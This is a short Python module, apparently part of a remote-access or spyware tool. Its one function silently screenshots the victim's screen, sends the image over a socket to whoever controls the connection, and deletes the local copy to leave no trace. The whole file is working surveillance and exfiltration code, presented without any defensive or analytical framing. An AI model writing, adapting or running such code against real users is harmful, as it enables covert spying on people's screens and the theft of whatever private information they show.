import pyautogui
import os

def capture_screenshot(my_socket):
    print("[+] Taking screenshot")

    screenshot = pyautogui.screenshot()

    screenshot_name = "screenshot.png"

    screenshot.save(screenshot_name)

    my_socket.send_file(screenshot_name)

    print("[+] Screenshot sent successfully")

    os.remove(screenshot_name)